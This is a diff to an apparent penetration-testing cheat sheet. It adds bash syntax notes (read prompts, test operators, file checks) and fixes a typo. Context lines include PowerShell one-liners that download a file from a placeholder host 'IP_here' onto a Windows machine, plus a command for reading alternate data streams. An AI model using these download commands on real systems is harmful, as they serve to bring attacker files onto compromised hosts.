@@ -249,6 +249,66 @@ echo $VARIABLE_HERE
 
 # send STDERR (2) to log file
 some_command_here 2> error.log
+
+# run bash with debug output
+\#!/bin/bash -x
+
+# capture user input + display
+read variable_name_here
+echo $variable_name_here
+
+# capture user input with prompt
+read -p 'prompt_here: ' variable_name_here
+
+# silently capture user input
+read -sp 'prompt_here: ' variable_name_here
+
+# not
+!expression_here
+
+# test for empty string
+# empty
+-z string_here
+# length > 0
+-n string_here
+
+# equal
+=
+-eq
+
+# not equal
+!=
+-ne
+
+# greater than
+-gt
+
+# greater than or equal
+-ge
+
+# less than
+-lt
+
+# less than or equal
+-le
+
+# file exists
+-e file_name_here
+
+# directory exists
+-d file_name_here
+
+# file exists + not empty
+-s file_name_here
+
+# file exists with read permission
+-r file_name_here
+
+# file exists with write permission
+-w file_name_here
+
+# file exists with execute permission
+-x file_name_here
 ```
 
 
@@ -1537,7 +1597,7 @@ Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP_here/file_here','C:\path\to\outfile')"
 
 # read text file
-Get-Content file_name-here
+Get-Content file_name_here
 
 # read alternate data stream
 Get-Content file_name_here -Stream ads_name_here
